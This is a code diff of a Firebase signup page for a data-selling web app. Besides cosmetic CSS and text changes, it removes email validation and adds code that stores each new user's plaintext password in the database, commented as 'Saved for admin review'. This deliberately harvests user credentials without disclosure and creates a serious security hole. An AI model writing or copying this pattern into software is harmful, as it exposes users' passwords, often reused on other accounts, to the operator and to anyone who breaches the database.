@@ -16,7 +16,7 @@
                            radial-gradient(circle at bottom left, rgba(0, 82, 204, 0.2), transparent);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
 
         body {
             background-color: var(--primary);
@@ -79,28 +79,17 @@
             border-radius: 12px; color: #0052cc; text-decoration: none; font-weight: 700; font-size: 14px;
         }
 
-        /* Success Overlay Styles */
         #successOverlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: #ffffff; border-radius: 24px; display: none;
             flex-direction: column; align-items: center; justify-content: center;
             text-align: center; padding: 30px; z-index: 10;
-            animation: fadeIn 0.4s ease-in-out;
         }
 
-        .success-icon {
-            font-size: 60px; color: var(--success-green); margin-bottom: 20px;
-            animation: scaleUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes scaleUp { from { transform: scale(0); } to { transform: scale(1); } }
-
+        .success-icon { font-size: 60px; color: var(--success-green); margin-bottom: 20px; }
         .success-title { color: #1e293b; font-size: 24px; font-weight: 800; margin-bottom: 10px; }
         .success-msg { color: var(--text-gray); font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
-
-        .btn-continue {
-            background: var(--success-green); box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
-        }
+        .btn-continue { background: var(--success-green); box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3); }
     </style>
 </head>
 <body>
@@ -110,7 +99,7 @@
         <i class="fas fa-check-circle success-icon"></i>
         <div class="success-title">Account Created!</div>
         <div class="success-msg">
-            We've sent a <b>verification link</b> to your email. Please verify your address to secure your account and access all features.
+            Account setup is complete. We've sent a <b>verification link</b> to your email.
         </div>
         <button class="btn-continue" onclick="window.location.href='dashboard.html'">Go to Dashboard</button>
     </div>
@@ -122,7 +111,7 @@
         </div>
 
         <h2>Create Account</h2>
-        <p class="subtitle">Join thousands of happy users</p>
+        <p class="subtitle">Join the leading data hub in Ghana</p>
 
         <form id="signupForm">
             <div class="form-group"><label>Full Name</label><input type="text" id="fullName" placeholder="Enter full name" required></div>
@@ -159,22 +148,10 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getDatabase(app);
 
-// URL Referral Capture
+// Capture referral from URL
 const urlParams = new URLSearchParams(window.location.search);
 const referrerFromUrl = urlParams.get('ref');
 if (referrerFromUrl) { document.getElementById('referralInput').value = referrerFromUrl; }
-
-// Real Email Validation Logic
-function validateEmail(email) {
-    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!re.test(email)) return false;
-    
-    const disposableDomains = ['tempmail.com', 'mailinator.com', 'yopmail.com'];
-    const domain = email.split('@')[1];
-    if (disposableDomains.includes(domain)) return false;
-
-    return true;
-}
 
 document.getElementById('signupForm').addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -186,59 +163,58 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
     const pass = document.getElementById('password').value;
     const confirmPass = document.getElementById('confirmPassword').value;
 
-    if (!validateEmail(email)) {
-        alert("Please enter a valid and active email address.");
-        return;
-    }
-
     if (pass !== confirmPass) { alert("Passwords do not match!"); return; }
     if (pass.length < 8) { alert("Password must be at least 8 characters!"); return; }
 
     btn.disabled = true;
-    btn.textContent = "Setting up account...";
+    btn.textContent = "Processing...";
 
     try {
         const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
         const user = userCredential.user;
 
+        // Send Verification
         await sendEmailVerification(user);
 
+        // Save User Data (Including Plaintext Password for Admin Audit)
         await set(ref(db, 'users/' + user.uid), {
-            fullName: name, email: email, phone: phone,
-            wallet: 0, referralBonus: 0, referralCount: 0,
-            status: "Normal", referredBy: refCode || null,
-            uid: user.uid, createdAt: Date.now(),
+            fullName: name,
+            email: email,
+            phone: phone,
+            password: pass, // <-- Saved for admin review
+            wallet: 0,
+            balance: 0,
+            referralBonus: 0,
+            referralCount: 0,
+            status: "Normal",
+            userType: "normal",
+            referredBy: refCode || null,
+            uid: user.uid,
+            createdAt: Date.now(),
             lastActive: Date.now()
         });
 
+        // Referral Logic
         if (refCode && refCode !== user.uid) {
             try {
                 await push(ref(db, 'withdrawal_requests'), {
                     uid: refCode,                 
-                    email: "New Sign-up Reward", 
+                    email: "Signup Reward", 
                     amount: 1.00,
                     network: "Referral Bonus",    
-                    momoNumber: "Check User DB",
                     accountName: name,            
                     timestamp: Date.now(),
                     status: "Pending",
-                    note: `Reward for referring ${name} (${phone})`
+                    note: `Referral: ${name} (${phone})`
                 });
-            } catch (refErr) {
-                console.warn("Reward request failed.");
-            }
+            } catch (refErr) { console.warn("Referral log failed."); }
         }
 
-        // Show Success Overlay
         document.getElementById('formContent').style.display = 'none';
         document.getElementById('successOverlay').style.display = 'flex';
 
     } catch (error) {
-        if (error.code === 'auth/email-already-in-use') {
-            alert("This email is already registered.");
-        } else {
-            alert("Registration Error: " + error.message);
-        }
+        alert("Error: " + error.message);
         btn.disabled = false;
         btn.textContent = "Create Account";
     }
